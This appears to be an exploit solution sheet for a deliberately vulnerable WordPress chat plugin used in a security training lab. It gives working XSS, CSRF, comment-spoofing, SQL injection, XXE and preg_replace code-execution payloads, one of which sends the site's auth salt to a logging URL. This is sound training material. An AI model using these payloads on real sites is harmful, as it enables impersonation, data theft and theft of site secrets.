Make admin say something
========================

With Blog Access
----------------

### XSS

```js
haX0R = true;
```

```html
<script>
(function() {
	if ( 'undefined' !== typeof haX0R ) {
		return;
	}

	jQuery( '.widget_chat_sploit textarea' ).val( 'I am lame HAHAHA' );

	jQuery( '.widget_chat_sploit form' ).submit();
})()
</script>
```

Without Blog Access
-------------------

### CSRF

```html
<form enctype="text/plain" action="http://vip.dev/security/wp-admin/admin-ajax.php?action=chatsploit" method="POST">
	<input type="hidden" name="&lt;chat&gt;" value="I am lame HAHAHA :)&lt;/chat&gt;" />
	<input type="submit" value="Click if you like cheese!" />
</form>
```

### Spoof

```bash
curl -i 'http://vip.dev/security/wp-comments-post.php' --form 'comment=I am lame HAHAHA!' --form 'author=admin' --form 'email=test@example.com' --form 'comment_post_ID=5'
```

Get the `comment_post_ID` from http://vip.dev/security/comments/feed/ or brute force with:

```bash
curl -i 'http://vip.dev/security/wp-comments-post.php' --form 'author=test' --form 'email=test@example.com' --form "comment_post_ID=$i"
```

Get list of all users' email adresses
=====================================

With Blog Access
----------------

### SQL Injection

```bash
curl -i 'http://vip.dev/security/wp-admin/admin-ajax.php?action=chatsploit&since=3013-05-14+00:00:00%27+UNION+SELECT+user_login+AS+author%2C+user_email+AS+text%2C+0+AS+time+FROM+wp_users+--+'
```

Without Blog Access
-------------------

ORLY?

Get the site's SECRET_KEYs
=========================

With Blog Access
----------------

### XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE xxe [<!ENTITY hi SYSTEM "php://filter/read=convert.base64-encode/resource=file:///home/vagrant/www/security/wp-config.php"> ]>
<chat>Hi! &hi;</chat>
```

You can use your own cookies.

```bash
cat xxe.xml | curl 'http://vip.dev/security/wp-admin/admin-ajax.php?action=chatsploit' --data @- -H 'Cookie: wordpress_9881e728288c003f340dfcb7f8c7c47c=author%7C1368155849%7Cb2da0569604d7e6bae7fc92758ab4eb7; wordpress_logged_in_9881e728288c003f340dfcb7f8c7c47c=author%7C1368155849%7Ce8138862195324278825dc3751409a14;'
```

Without Blog Access
-------------------

Get blog access first ;)

Or just use the arbitrary code execution vulnerability.

Get the site's SECRET_SALTs
===========================

`PREG_REPLACE_EVAL`
-------------------

### With Blog Access

```
hello http://example.com/{${substr(a.($a=get_option(auth_salt)),0,1)}} there

hello http://example.com/{${substr(chr(97).($a=get_option(chr(97).chr(117).chr(116).chr(104).chr(95).chr(115).chr(97).chr(108).chr(116))),0,1)}} there
```

### Without Blog Access

sploit.php:
```php
<?php

$log_url = 'http://vip.dev/log.php?';

$encoded_url = '';

for ( $i = 0; $i < strlen( $log_url ); $i++ ) {
	$encoded_url .= 'chr(' . ord( $log_url[$i] ) . ').';
}

$sploit = 'hello http://example.com/{${substr(chr(97).($a=' . mt_rand() . ').(file_get_contents(' . $encoded_url . 'urlencode(get_option(chr(97).chr(117).chr(116).chr(104).chr(95).chr(115).chr(97).chr(108).chr(116))))),0,1)}} there';

echo "$sploit\n";
```

```bash
curl -i 'http://vip.dev/security/wp-comments-post.php' --form 'author=admin' --form 'email=test@example.com' --form 'comment_post_ID=5' --form "comment=$( php sloit.php )"
HTTP/1.1 100 Continue
```
